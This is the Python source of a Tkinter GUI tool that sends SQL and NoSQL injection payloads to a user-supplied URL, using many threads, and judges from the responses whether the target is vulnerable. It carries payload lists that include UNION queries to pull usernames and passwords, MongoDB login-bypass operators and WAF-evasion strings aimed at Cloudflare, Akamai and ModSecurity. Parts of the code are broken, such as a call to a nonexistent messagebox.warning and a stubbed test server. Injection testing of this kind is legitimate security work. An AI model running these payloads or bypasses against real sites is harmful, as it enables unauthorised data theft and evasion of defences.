import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import requests
import time
import concurrent.futures
import sqlite3
import pymongo
import re
from urllib.parse import urlparse, parse_qs
import json

class DBInjectionTester:
    def __init__(self, root):
        self.root = root
        self.root.title("Database Injection Vulnerability Tester")
        self.root.geometry("900x700")
        
        # Create main notebook
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create tabs
        self.setup_tab = ttk.Frame(self.notebook)
        self.sql_tab = ttk.Frame(self.notebook)
        self.nosql_tab = ttk.Frame(self.notebook)
        self.results_tab = ttk.Frame(self.notebook)
        self.firewall_bypass_tab = ttk.Frame(self.notebook)
        
        self.notebook.add(self.setup_tab, text="Setup")
        self.notebook.add(self.sql_tab, text="SQL Injection")
        self.notebook.add(self.nosql_tab, text="NoSQL Injection")
        self.notebook.add(self.firewall_bypass_tab, text="WAF Bypass")
        self.notebook.add(self.results_tab, text="Results & Reports")
        
        # Setup variables
        self.target_url = tk.StringVar()
        self.target_param = tk.StringVar()
        self.http_method = tk.StringVar(value="GET")
        self.cookies = tk.StringVar()
        self.headers = tk.StringVar()
        self.timeout = tk.IntVar(value=10)
        self.threads = tk.IntVar(value=5)
        
        # Initialize results storage
        self.results = []
        
        # Build the UI
        self.build_setup_tab()
        self.build_sql_tab()
        self.build_nosql_tab()
        self.build_firewall_bypass_tab()
        self.build_results_tab()
    
    def build_setup_tab(self):
        frame = ttk.LabelFrame(self.setup_tab, text="Target Configuration")
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # URL and parameter inputs
        ttk.Label(frame, text="Target URL:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.target_url, width=70).grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(frame, text="Parameter to Test:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.target_param, width=70).grid(row=1, column=1, padx=5, pady=5)
        
        # HTTP Method selection
        ttk.Label(frame, text="HTTP Method:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
        method_combo = ttk.Combobox(frame, textvariable=self.http_method, values=["GET", "POST"])
        method_combo.grid(row=2, column=1, sticky=tk.W, padx=5, pady=5)
        
        # Cookies and headers
        ttk.Label(frame, text="Cookies (name=value; ...):").grid(row=3, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.cookies, width=70).grid(row=3, column=1, padx=5, pady=5)
        
        ttk.Label(frame, text="Headers (JSON format):").grid(row=4, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.headers, width=70).grid(row=4, column=1, padx=5, pady=5)
        
        # Performance settings
        perf_frame = ttk.LabelFrame(self.setup_tab, text="Performance Settings")
        perf_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(perf_frame, text="Request Timeout (seconds):").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Spinbox(perf_frame, from_=1, to=60, textvariable=self.timeout, width=5).grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)
        
        ttk.Label(perf_frame, text="Thread Count:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Spinbox(perf_frame, from_=1, to=20, textvariable=self.threads, width=5).grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)
        
        # Connection test button
        test_button = ttk.Button(self.setup_tab, text="Test Connection", command=self.test_connection)
        test_button.pack(pady=10)
        
        # Explanation section
        exp_frame = ttk.LabelFrame(self.setup_tab, text="How to Use")
        exp_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        explanation = """
1. Enter the target URL with a parameter placeholder (e.g., http://example.com/page.php?id=1)
2. Specify which parameter to test (e.g., id)
3. Set HTTP method, cookies, and headers if needed
4. Test the connection to ensure the target is reachable
5. Navigate to the appropriate injection tab (SQL or NoSQL)
6. Select the testing method and run the test
7. Review results in the Results tab
        """
        exp_text = scrolledtext.ScrolledText(exp_frame, wrap=tk.WORD, height=10)
        exp_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        exp_text.insert(tk.END, explanation)
        exp_text.config(state=tk.DISABLED)
    
    def build_sql_tab(self):
        # Create frames
        options_frame = ttk.LabelFrame(self.sql_tab, text="SQL Injection Options")
        options_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Injection types
        self.sql_type = tk.StringVar(value="error")
        ttk.Label(options_frame, text="Injection Type:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        types = ttk.Combobox(options_frame, textvariable=self.sql_type, 
                            values=["error", "union", "boolean", "time"])
        types.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)
        
        # DBMS selection
        self.dbms = tk.StringVar(value="mysql")
        ttk.Label(options_frame, text="Database Type:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        dbms_combo = ttk.Combobox(options_frame, textvariable=self.dbms, 
                                values=["mysql", "mssql", "oracle", "postgresql", "sqlite"])
        dbms_combo.grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)
        
        # Custom payload entry
        ttk.Label(options_frame, text="Custom Payload:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
        self.custom_sql_payload = tk.StringVar()
        ttk.Entry(options_frame, textvariable=self.custom_sql_payload, width=50).grid(row=2, column=1, padx=5, pady=5)
        
        # Test buttons
        buttons_frame = ttk.Frame(self.sql_tab)
        buttons_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(buttons_frame, text="Run Standard Tests", command=self.run_sql_tests).pack(side=tk.LEFT, padx=5)
        ttk.Button(buttons_frame, text="Run Custom Payload", command=self.run_sql_custom).pack(side=tk.LEFT, padx=5)
        
        # Payloads list
        payloads_frame = ttk.LabelFrame(self.sql_tab, text="Common SQL Injection Payloads")
        payloads_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.sql_payloads_text = scrolledtext.ScrolledText(payloads_frame, wrap=tk.WORD)
        self.sql_payloads_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Populate with common payloads
        sql_payloads = """
# Error-based SQL Injection
'
' OR '1'='1
' OR 1=1 --
" OR 1=1 --
' OR '1'='1' --
') OR ('1'='1
1' OR '1' = '1
' UNION SELECT 1,2,3 --

# Time-based SQL Injection
'; WAITFOR DELAY '0:0:5' --
' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --
' OR pg_sleep(5) --

# Boolean-based SQL Injection  
' AND 1=1 --
' AND 1=2 --

# UNION-based SQL Injection
' UNION SELECT username,password,3 FROM users --
' UNION SELECT table_name,2,3 FROM information_schema.tables --

# Different Database Syntaxes
# MySQL
' UNION SELECT @@version,2,3 --
# MSSQL
' UNION SELECT @@version,2,3 --
# Oracle
' UNION SELECT banner,NULL,NULL FROM v$version --
# PostgreSQL
' UNION SELECT version(),2,3 --
# SQLite
' UNION SELECT sqlite_version(),2,3 --
        """
        self.sql_payloads_text.insert(tk.END, sql_payloads)
    
    def build_nosql_tab(self):
        # Create frames
        options_frame = ttk.LabelFrame(self.nosql_tab, text="NoSQL Injection Options")
        options_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # NoSQL DB type
        self.nosql_type = tk.StringVar(value="mongodb")
        ttk.Label(options_frame, text="NoSQL Type:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        types = ttk.Combobox(options_frame, textvariable=self.nosql_type, 
                            values=["mongodb", "redis", "couchdb"])
        types.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)
        
        # Custom payload entry
        ttk.Label(options_frame, text="Custom Payload:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.custom_nosql_payload = tk.StringVar()
        ttk.Entry(options_frame, textvariable=self.custom_nosql_payload, width=50).grid(row=1, column=1, padx=5, pady=5)
        
        # Test buttons
        buttons_frame = ttk.Frame(self.nosql_tab)
        buttons_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(buttons_frame, text="Run NoSQL Tests", command=self.run_nosql_tests).pack(side=tk.LEFT, padx=5)
        ttk.Button(buttons_frame, text="Run Custom Payload", command=self.run_nosql_custom).pack(side=tk.LEFT, padx=5)
        
        # Payloads list
        payloads_frame = ttk.LabelFrame(self.nosql_tab, text="Common NoSQL Injection Payloads")
        payloads_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.nosql_payloads_text = scrolledtext.ScrolledText(payloads_frame, wrap=tk.WORD)
        self.nosql_payloads_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Populate with common payloads
        nosql_payloads = """
# MongoDB Injection
{"username": {"$ne": null}}
{"username": {"$in": ["admin", "user", "moderator"]}}
{"username": {"$regex": "admin"}}
{"$where": "sleep(5000)"}
{"$where": "this.password.match(/.*/)"}

# Parameter pollution
username[$ne]=null
username[$regex]=.*
username[$exists]=true

# JSON-based attacks
{"$where": "function() { return 1==1; }"}
{"username": {"$gt": ""}}
{"username": {"$nin": ["user1", "user2"]}}

# Advanced MongoDB
{"username": "admin", "$where": "this.password == 'password'"}
{"username": {"$exists": true}, "password": {"$exists": true}}
{"username": "admin", "_id": {"$ne": null}}
        """
        self.nosql_payloads_text.insert(tk.END, nosql_payloads)
    
    def build_firewall_bypass_tab(self):
        # Create frames
        options_frame = ttk.LabelFrame(self.firewall_bypass_tab, text="WAF Bypass Techniques")
        options_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # WAF type
        self.waf_type = tk.StringVar(value="generic")
        ttk.Label(options_frame, text="WAF Type:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        types = ttk.Combobox(options_frame, textvariable=self.waf_type, 
                            values=["generic", "cloudflare", "akamai", "f5", "modsecurity"])
        types.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)
        
        # Custom bypass payload
        ttk.Label(options_frame, text="Custom Bypass:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.custom_waf_bypass = tk.StringVar()
        ttk.Entry(options_frame, textvariable=self.custom_waf_bypass, width=50).grid(row=1, column=1, padx=5, pady=5)
        
        # Test buttons
        buttons_frame = ttk.Frame(self.firewall_bypass_tab)
        buttons_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(buttons_frame, text="Run Bypass Tests", command=self.run_bypass_tests).pack(side=tk.LEFT, padx=5)
        ttk.Button(buttons_frame, text="Test Custom Bypass", command=self.run_custom_bypass).pack(side=tk.LEFT, padx=5)
        
        # Techniques list
        techniques_frame = ttk.LabelFrame(self.firewall_bypass_tab, text="WAF Bypass Techniques")
        techniques_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.waf_techniques_text = scrolledtext.ScrolledText(techniques_frame, wrap=tk.WORD)
        self.waf_techniques_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Populate with common techniques
        waf_techniques = """
# Encoding Techniques
URL Encoding: %27%20OR%201=1%20--%20
Double URL Encoding: %2527%2520OR%25201=1%2520--%2520
Unicode Encoding: %u0027%u0020OR%u00201=1%u0020--%u0020
HTML Encoding: &#39;&#32;OR&#32;1=1&#32;--&#32;

# Obfuscation Techniques
Case Variation: Or, oR, OR
Comment Insertion: 'OR/**/1=1/**/--
Whitespace Manipulation: '  OR    1=1    --
Null Byte Injection: %00' OR 1=1 --

# Equivalent Expressions
Logical Equivalents: ' OR 2>1 --
Alternative Operators: ' || 1=1 --
Nested Queries: ' OR (SELECT 1)=1 --

# SQL Dialect Specific Bypasses
MySQL: /*!50000 SELECT */ 1
PostgreSQL: ' OR 1::int=1 --
MSSQL: '; EXEC('SEL' + 'ECT 1') --

# Special Characters
Backtick: `column`
Parentheses Variation: (')OR(1)=(1)--

# Time-delay Techniques (avoid WAF timeout)
Small Delays: '; WAITFOR DELAY '0:0:1' --
Incremental Testing: '; IF 1=1 WAITFOR DELAY '0:0:1' --

# HTTP Parameter Pollution
id=1&id=' OR '1'='1
        """
        self.waf_techniques_text.insert(tk.END, waf_techniques)
    
    def build_results_tab(self):
        # Create results display
        self.results_text = scrolledtext.ScrolledText(self.results_tab, wrap=tk.WORD)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Buttons for managing results
        buttons_frame = ttk.Frame(self.results_tab)
        buttons_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(buttons_frame, text="Clear Results", command=self.clear_results).pack(side=tk.LEFT, padx=5)
        ttk.Button(buttons_frame, text="Save Results", command=self.save_results).pack(side=tk.LEFT, padx=5)
    
    def test_connection(self):
        url = self.target_url.get()
        if not url:
            messagebox.showerror("Error", "Please enter a target URL")
            return
        
        try:
            # Parse headers if provided
            headers = {}
            if self.headers.get():
                try:
                    headers = json.loads(self.headers.get())
                except json.JSONDecodeError:
                    messagebox.showerror("Error", "Invalid JSON format for headers")
                    return
            
            # Parse cookies if provided
            cookies = {}
            if self.cookies.get():
                cookie_pairs = self.cookies.get().split(';')
                for pair in cookie_pairs:
                    if '=' in pair:
                        key, value = pair.strip().split('=', 1)
                        cookies[key] = value
            
            # Make request
            response = requests.get(
                url, 
                headers=headers, 
                cookies=cookies, 
                timeout=self.timeout.get()
            )
            
            # Check response
            if response.status_code < 400:
                messagebox.showinfo("Success", f"Connection successful! Status code: {response.status_code}")
                self.add_result(f"Connection test successful for {url}\nStatus code: {response.status_code}")
            else:
                messagebox.warning("Warning", f"Connection received error response: {response.status_code}")
                self.add_result(f"Connection test warning for {url}\nStatus code: {response.status_code}")
        
        except requests.exceptions.RequestException as e:
            messagebox.showerror("Error", f"Connection failed: {str(e)}")
            self.add_result(f"Connection test failed for {url}\nError: {str(e)}")
    
    def get_request_data(self):
        url = self.target_url.get()
        param = self.target_param.get()
        method = self.http_method.get()
        
        # Parse headers
        headers = {}
        if self.headers.get():
            try:
                headers = json.loads(self.headers.get())
            except json.JSONDecodeError:
                messagebox.showerror("Error", "Invalid JSON format for headers")
                return None
        
        # Parse cookies
        cookies = {}
        if self.cookies.get():
            cookie_pairs = self.cookies.get().split(';')
            for pair in cookie_pairs:
                if '=' in pair:
                    key, value = pair.strip().split('=', 1)
                    cookies[key] = value
        
        return {
            'url': url,
            'param': param,
            'method': method,
            'headers': headers,
            'cookies': cookies,
            'timeout': self.timeout.get()
        }
    
    def run_sql_tests(self):
        request_data = self.get_request_data()
        if not request_data:
            return
        
        # Get test configuration
        injection_type = self.sql_type.get()
        dbms = self.dbms.get()
        
        # Load appropriate payloads
        payloads = []
        if injection_type == "error":
            payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "' OR 1=1 --", "\" OR 1=1 --"]
        elif injection_type == "union":
            if dbms == "mysql":
                payloads = ["' UNION SELECT 1,2,3 --", "' UNION SELECT 1,2,3,4 --"]
            elif dbms == "mssql":
                payloads = ["' UNION SELECT 1,2,3 --", "' UNION ALL SELECT 1,2,3 --"]
            else:
                payloads = ["' UNION SELECT 1,2,3 --", "' UNION SELECT NULL,NULL,NULL --"]
        elif injection_type == "boolean":
            payloads = ["' AND 1=1 --", "' AND 1=2 --", "' OR 1=1 --", "' OR 1=2 --"]
        elif injection_type == "time":
            if dbms == "mysql":
                payloads = ["' OR (SELECT * FROM (SELECT(SLEEP(2)))a) --", "' OR SLEEP(2) --"]
            elif dbms == "mssql":
                payloads = ["'; WAITFOR DELAY '0:0:2' --", "'); WAITFOR DELAY '0:0:2' --"]
            elif dbms == "postgresql":
                payloads = ["'; SELECT pg_sleep(2) --", "' OR pg_sleep(2) --"]
            else:
                payloads = ["'; SELECT sleep(2) --", "' OR sleep(2) --"]
        
        # Run tests
        self.add_result(f"Starting SQL injection tests ({injection_type}) for {dbms}")
        self.run_payloads(request_data, payloads)
    
    def run_sql_custom(self):
        request_data = self.get_request_data()
        if not request_data:
            return
        
        payload = self.custom_sql_payload.get()
        if not payload:
            messagebox.showerror("Error", "Please enter a custom SQL injection payload")
            return
        
        self.add_result(f"Testing custom SQL payload: {payload}")
        self.run_payloads(request_data, [payload])
    
    def run_nosql_tests(self):
        request_data = self.get_request_data()
        if not request_data:
            return
        
        nosql_type = self.nosql_type.get()
        
        # Load appropriate payloads
        payloads = []
        if nosql_type == "mongodb":
            payloads = [
                '{"username": {"$ne": null}}',
                '{"username": {"$gt": ""}}',
                '{"$where": "this.password.match(/.*/)"}',
                'username[$ne]=null',
                'username[$exists]=true'
            ]
        elif nosql_type == "redis":
            payloads = [
                'KEYS *',
                'INFO',
                'CONFIG GET *'
            ]
        elif nosql_type == "couchdb":
            payloads = [
                '/_all_dbs',
                '/_utils/',
                '/_config/'
            ]
        
        # Run tests
        self.add_result(f"Starting NoSQL injection tests for {nosql_type}")
        self.run_payloads(request_data, payloads)
    
    def run_nosql_custom(self):
        request_data = self.get_request_data()
        if not request_data:
            return
        
        payload = self.custom_nosql_payload.get()
        if not payload:
            messagebox.showerror("Error", "Please enter a custom NoSQL injection payload")
            return
        
        self.add_result(f"Testing custom NoSQL payload: {payload}")
        self.run_payloads(request_data, [payload])
    
    def run_bypass_tests(self):
        request_data = self.get_request_data()
        if not request_data:
            return
        
        waf_type = self.waf_type.get()
        
        # Load appropriate bypass techniques
        payloads = []
        if waf_type == "generic":
            payloads = [
                '%27%20OR%201=1%20--%20',  # URL Encoding
                '&#39; OR 1=1 --',         # HTML Encoding
                "' OR/**/ 1=1 /**/ --",    # Comment Insertion
                "' OR\t1=1\t--",           # Tab Insertion
                "'/**/OR/**/1=1/**/--"     # Comment Obfuscation
            ]
        elif waf_type == "cloudflare":
            payloads = [
                "')+OR+1=1--",
                "'%0bOR%0b1=1--",
                "'%0d%0aOR%0d%0a1=1--",
                "'/*!50000*/OR/**/1=1--"
            ]
        elif waf_type == "akamai":
            payloads = [
                "'%23%0aOR%23%0a1=1--",
                "'%2b%0aOR%2b%0a1=1--",
                "'/**/union/**/select/**/"
            ]
        elif waf_type == "modsecurity":
            payloads = [
                "' /*!50000*/OR 1=1--",
                "'+CASE+WHEN+(1=1)+THEN+1+ELSE+0+END--",
                "'%0dOR%0d1=1--"
            ]
        
        # Run tests
        self.add_result(f"Starting WAF bypass tests for {waf_type}")
        self.run_payloads(request_data, payloads)
    
    def run_custom_bypass(self):
        request_data = self.get_request_data()
        if not request_data:
            return
        
        payload = self.custom_waf_bypass.get()
        if not payload:
            messagebox.showerror("Error", "Please enter a custom WAF bypass payload")
            return
        
        self.add_result(f"Testing custom WAF bypass: {payload}")
        self.run_payloads(request_data, [payload])
    
    def run_payloads(self, request_data, payloads):
        if not payloads:
            messagebox.showinfo("Info", "No payloads to test")
            return
        
        url = request_data['url']
        param = request_data['param']
        method = request_data['method']
        headers = request_data['headers']
        cookies = request_data['cookies']
        timeout = request_data['timeout']
        
        # Check if parameter placeholder exists in URL
        if '{' + param + '}' in url:
            base_url = url
        else:
            # Check if parameter already exists in URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            if param in query_params:
                # Replace existing parameter with placeholder
                new_params = []
                for key, value in query_params.items():
                    if key == param:
                        new_params.append(f"{key}={{{param}}}")
                    else:
                        new_params.append(f"{key}={value[0]}")
                
                query_string = "&".join(new_params)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
            else:
                # Add parameter if it doesn't exist
                if parsed_url.query:
                    base_url = f"{url}&{param}={{{param}}}"
                else:
                    base_url = f"{url}?{param}={{{param}}}"
        
        # Set up progress
        progress = tk.IntVar()
        progress_window = tk.Toplevel(self.root)
        progress_window.title("Testing Progress")
        progress_window.geometry("300x100")
        
        ttk.Label(progress_window, text="Running injection tests...").pack(pady=10)
        progress_bar = ttk.Progressbar(progress_window, variable=progress, maximum=len(payloads))
        progress_bar.pack(fill=tk.X, padx=20, pady=10)
        
        # Run tests in parallel
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads.get()) as executor:
            # Submit all tasks
            future_to_payload = {
                executor.submit(
                    self.test_payload, 
                    base_url, 
                    param, 
                    payload, 
                    method, 
                    headers, 
                    cookies, 
                    timeout
                ): payload for payload in payloads
            }
            
            # Process completed tasks
            for i, future in enumerate(concurrent.futures.as_completed(future_to_payload)):
                payload = future_to_payload[future]
                progress.set(i + 1)
                progress_window.update()
                
                try:
                    result = future.result()
                    self.add_result(result)
                except Exception as e:
                    self.add_result(f"Error testing payload '{payload}': {str(e)}")
        
        progress_window.destroy()
        messagebox.showinfo("Complete", f"Completed testing {len(payloads)} payloads")
    
    def test_payload(self, base_url, param, payload, method, headers, cookies, timeout):
        try:
            # Create test URL with payload
            test_url = base_url.replace('{' + param + '}', payload)
            
            # Measure response time
            start_time = time.time()
            
            # Make request
            if method.upper() == 'GET':
                response = requests.get(
                    test_url, 
                    headers=headers, 
                    cookies=cookies, 
                    timeout=timeout,
                    allow_redirects=False
                )
            else:  # POST
                # For POST, we need to extract the params and add our payload
                parsed_url = urlparse(test_url)
                params = {}
                
                # Extract existing params
                if parsed_url.query:
                    for key, value in parse_qs(parsed_url.query).items():
                        params[key] = value[0]
                
                # Make POST request to base URL without query string
                base_post_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                response = requests.post(
                    base_post_url,
                    data=params,
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False
                )
            
            # Calculate response time
            response_time = time.time() - start_time
            
            # Check for signs of successful injection
            injection_detected = self.analyze_response(response, payload, response_time)
            
            # Format result
            if injection_detected:
                result = f"[VULNERABLE] Payload: {payload}\n"
                result += f"Status: {response.status_code}, Size: {len(response.text)}, Time: {response_time:.2f}s\n"
                result += f"Detected: {injection_detected}\n"
                result += "-" * 60
            else:
                result = f"[TESTED] Payload: {payload}\n"
                result += f"Status: {response.status_code}, Size: {len(response.text)}, Time: {response_time:.2f}s\n"
                result += "-" * 60
            
            return result
        
        except requests.exceptions.Timeout:
            # Special case for time-based injections
            if "SLEEP" in payload.upper() or "DELAY" in payload.upper() or "pg_sleep" in payload:
                return f"[POSSIBLE VULNERABLE - TIMEOUT] Payload: {payload}\n" + "-" * 60
            else:
                return f"[TIMEOUT] Payload: {payload}\n" + "-" * 60
            
        except requests.exceptions.RequestException as e:
            return f"[ERROR] Payload: {payload}, Error: {str(e)}\n" + "-" * 60
    
    def analyze_response(self, response, payload, response_time):
        # Check for common error messages that might indicate injection
        error_patterns = [
            r"SQL syntax.*?error",
            r"Warning.*?mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"ORA-[0-9]+",
            r"Oracle error",
            r"Microsoft SQL Server error",
            r"ODBC SQL Server error",
            r"SQLServer JDBC Driver",
            r"PostgreSQL.*?ERROR",
            r"ERROR:.*?syntax error",
            r"unterminated quoted string",
            r"unexpected token",
            r"CastError"
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return f"Error pattern found: {pattern}"
        
        # Check for time-based indicators
        if ("SLEEP" in payload.upper() or "DELAY" in payload.upper() or "pg_sleep" in payload) and response_time > 2:
            return f"Time-based injection likely (delay: {response_time:.2f}s)"
        
        # Check for content indicators in UNION-based tests
        if "UNION SELECT" in payload.upper():
            # Look for numbers that might indicate successful column enumeration
            cols = re.findall(r'\b\d+\b', payload)
            for col in cols:
                if col in response.text:
                    return f"UNION injection likely (column value found: {col})"
        
        # Check for boolean-based indicators
        if ("AND 1=1" in payload or "OR 1=1" in payload) and response.status_code == 200:
            if "AND 1=2" in payload or "OR 1=2" in payload:
                # This is a negative test, should not return normal results
                if response.status_code != 200:
                    return "Boolean-based injection likely (different responses for true/false conditions)"
        
        # Check for NoSQL specific patterns
        if "$ne" in payload or "$gt" in payload or "$where" in payload:
            # These are common in NoSQL injections
            if response.status_code == 200:
                return "Possible NoSQL injection (successful request with NoSQL operators)"
        
        # No clear signs of vulnerability
        return None
    
    def add_result(self, result):
        self.results.append(result)
        self.results_text.config(state=tk.NORMAL)
        self.results_text.insert(tk.END, result + "\n\n")
        self.results_text.see(tk.END)
        self.results_text.config(state=tk.DISABLED)
    
    def clear_results(self):
        self.results = []
        self.results_text.config(state=tk.NORMAL)
        self.results_text.delete(1.0, tk.END)
        self.results_text.config(state=tk.DISABLED)
    
    def save_results(self):
        if not self.results:
            messagebox.showinfo("Info", "No results to save")
            return
        
        try:
            filename = tk.filedialog.asksaveasfilename(
                defaultextension=".txt",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
            
            if not filename:
                return
            
            with open(filename, "w") as f:
                f.write("Database Injection Test Results\n")
                f.write("=============================\n\n")
                f.write(f"Target: {self.target_url.get()}\n")
                f.write(f"Parameter tested: {self.target_param.get()}\n")
                f.write(f"Test date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                for result in self.results:
                    f.write(result + "\n\n")
            
            messagebox.showinfo("Success", f"Results saved to {filename}")
        
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save results: {str(e)}")


class DatabaseSimulator:
    """A simple database simulator for testing the tool locally"""
    
    def __init__(self):
        self.setup_sqlite()
    
    def setup_sqlite(self):
        # Create a sample SQLite database
        self.conn = sqlite3.connect(':memory:')
        cursor = self.conn.cursor()
        
        # Create tables
        cursor.execute('''
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            email TEXT
        )
        ''')
        
        # Add sample data
        sample_users = [
            (1, 'admin', 'admin123', 'admin@example.com'),
            (2, 'user1', 'password1', 'user1@example.com'),
            (3, 'user2', 'password2', 'user2@example.com')
        ]
        
        cursor.executemany('INSERT INTO users VALUES (?, ?, ?, ?)', sample_users)
        self.conn.commit()
    
    def query(self, sql):
        """Execute a SQL query and return results"""
        try:
            cursor = self.conn.cursor()
            cursor.execute(sql)
            return cursor.fetchall()
        except sqlite3.Error as e:
            return f"SQL Error: {str(e)}"


def start_simulation_server():
    """Start a local server for testing the tool"""
    # This would implement a simple HTTP server with vulnerable endpoints
    # Not implemented in this prototype
    pass


def main():
    root = tk.Tk()
    app = DBInjectionTester(root)
    root.mainloop()


if __name__ == "__main__":
    main()
